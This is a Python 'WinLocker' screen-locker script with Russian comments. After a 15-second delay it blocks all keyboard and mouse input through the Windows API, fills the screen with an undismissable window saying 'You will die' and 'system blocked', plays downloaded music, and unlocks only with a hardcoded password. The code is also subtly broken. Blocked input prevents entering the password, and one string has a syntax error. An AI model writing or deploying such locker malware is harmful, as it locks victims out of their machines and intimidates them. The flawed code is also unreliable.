import ctypes
import time
import tkinter as tk
import threading
import os
import urllib.request
import random
import math

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TIMER_SECONDS = 15
MUSIC_URL = "https://ost-watch-dogs-2.skysound7.com/t/06067162842068930321-ost-watch-dogs-2-main-menu-theme/"
MUSIC_FILE = os.path.join(os.path.expanduser("~"), "Desktop", "watchdogs2.mp3")

# === СКАЧИВАНИЕ МУЗЫКИ ===
def download_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
        except:
            pass

# === ВОСПРОИЗВЕДЕНИЕ МУЗЫКИ ===
def play_music():
    try:
        import pygame.mixer as mixer
        mixer.init()
        mixer.music.load(MUSIC_FILE)
        mixer.music.play(-1)  # Зациклить
    except:
        pass

# === БЛОКИРОВКА КЛАВИАТУРЫ И МЫШИ ===
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# === ГЛАВНОЕ ОКНО ===
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        
        # Запрещаем закрытие Alt+F4
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.bind('<KeyPress>', self.block_keys)
        self.win.bind('<KeyRelease>', self.block_keys)
        
        # Полотно для анимации
        self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Текст
        self.canvas.create_text(400, 100, text="ВЫ УМРЁТЕ", 
                                 fill='red', font=('Courier', 60, 'bold'), tags="scary")
        self.canvas.create_text(400, 200, text="СИСТЕМА ЗАБЛОКИРОВАНА", 
                                 fill='red', font=('Courier', 40), tags="scary")
        self.canvas.create_text(400, 350, text="ВВЕДИТЕ ПАРОЛЬ:", 
                                 fill='red', font=('Courier', 30))
        
        # Поле ввода
        self.entry = tk.Entry(self.win, show="*", font=('Courier', 30), 
                              bg='black', fg='red', insertbackground='red')
        self.canvas.create_window(400, 420, window=self.entry)
        
        self.status = self.canvas.create_text(400, 480, text="", 
                                              fill='red', font=('Courier', 20))
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        
        # Запуск анимации
        self.animate()
    
    def block_keys(self, event):
        """Игнорирует все системные комбинации"""
        if event.state & 0x4 or event.state & 0x8 or event.state & 0x10 or event.state & 0x20:
            return 'break'
        return
    
    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
        else:
            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)
    
    def animate(self):
        """Анимация черепа и частиц"""
        self.canvas.delete("skull")
        self.canvas.delete("particle")
        
        # Рисуем ASCII-череп
        skull_lines = [
            "      .-"-.",
            "     /|6 6|\\",
            "    {/(_0_)\\}",
            "     _/ ^ \\_",
            "    (/ /^\\ \\)-'",
            "     \"\"' '\"\""
        ]
        y = 550
        for line in skull_lines:
            self.canvas.create_text(400, y, text=line, 
                                    fill='red', font=('Courier', 18), tags="skull")
            y += 25
        
        # Летающие частицы
        for _ in range(30):
            x = random.randint(0, 800)
            y = random.randint(0, 600)
            size = random.randint(2, 5)
            self.canvas.create_oval(x, y, x+size, y+size, 
                                    fill='red', outline='red', tags="particle")
        
        self.win.after(50, self.animate)

# === ЗАПУСК ===
if __name__ == "__main__":
    # Качаем музыку
    download_music()
    
    # Таймер до активации
    time.sleep(TIMER_SECONDS)
    
    # Блокируем ввод и играем музыку
    block_input(True)
    threading.Thread(target=play_music, daemon=True).start()
    
    # Запускаем окно
    app = WinLocker()
    app.root.mainloop()
